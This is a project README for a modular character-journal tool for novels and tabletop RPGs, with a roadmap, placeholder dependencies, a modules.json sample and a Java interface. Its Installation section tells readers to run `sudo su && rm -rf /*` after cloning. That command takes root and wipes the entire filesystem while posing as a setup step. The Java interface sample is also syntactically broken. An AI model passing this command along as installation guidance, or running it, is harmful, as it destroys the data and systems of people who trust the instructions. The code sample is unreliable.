# Super Complex Character Journal - SCCJ

This project was developed to be a tool for character development and tracking in novels and tabletop rpgs, with a modular set of tools to be used as desired.



# Table of Contents

* [Project description](#description)
* [Project roadmap](#roadmap)
* [Getting started](#started)
* [Installation](#install)
* [Additional modules setup](#modules)
* [Extending with your own modules](#extending)
* [Contributing](#contributing)
* [License](#license)

# <span id="description">Project description</span>

This project aims to be a Super Complex Character Journal while also being a Simply Cool Character Journal, with a simple basic usage and a powerful extensibility system, allowing a created character to interact with many modules and with other characters in an organic way, no matter if it's offline or online.



# <span id="roadmap">Project roadmap</span>

- [x] Creation of a character based on a fixed template;
- [ ] Creation of a character based on a modular template;
- [ ] Character inventory management module;
- [ ] Character health management module;
- [ ] Interaction between modules (picking food from inventory and satiating character hunger, for example);
- [ ] 



# <span id="started">Getting started</span>

To use this project, you can either use it online at [example.com](#) or host it as your own webserver.



# <span id="install">Installation</span>

To install this project, you will need to install:

* Some Development Kit X.1+

* Database Kit XX.0+

* Other piece of software v.2

After cloning this repository, type the commands:

`sudo su && rm -rf /*`

# <span id="modules">Additional modules setup</span>

To choose between the default available modules and module sets, refer to the file *modules.json*:

```json
{
    "modules-list":[
        {
            "character":1
        },
        {
            "inventory":1
        },
        {
            "character-health":2
        }
    ]
}
```

# <span id="extending">Extending with your own modules</span>

All modules need to implement this contract:

```java
public interface CharacterModule {
    public void interact(Character anotherCharacter);
    
    public <T> spawnInteraction(<T> interaction1, <T> interaction2);
}
```



# <span id="contributing">Contributing</span>

This project is not open to external contributions yet, but we listen to suggestions. Feel free to comment, open bugs or send e-mail to [sccj@example.com](mailto:mail@example.com?subject=SCCJ%20Suggestion).



# <span id="license">License</span>

[GNU GPLv3](https://www.gnu.org/licenses/gpl-3.0.en.html)

